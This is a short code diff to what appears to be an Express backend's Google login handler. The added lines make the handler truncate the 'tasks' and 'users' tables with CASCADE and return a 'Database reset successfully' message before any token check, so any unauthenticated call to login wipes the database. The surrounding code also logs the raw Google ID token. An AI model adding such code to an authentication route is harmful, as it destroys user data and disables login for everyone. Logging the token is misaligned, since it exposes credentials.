@@ -14,6 +14,17 @@ if (getApps().length === 0) {
 
 export const googleLogin = async (req, res) => {
   try {
+
+              await pool.query(`
+  TRUNCATE TABLE tasks, users CASCADE;
+`);
+
+return res.status(200).json({
+  success: true,
+  message: "Database reset successfully."
+});
+
+
     const { idToken } = req.body;
 
      console.log(idToken);
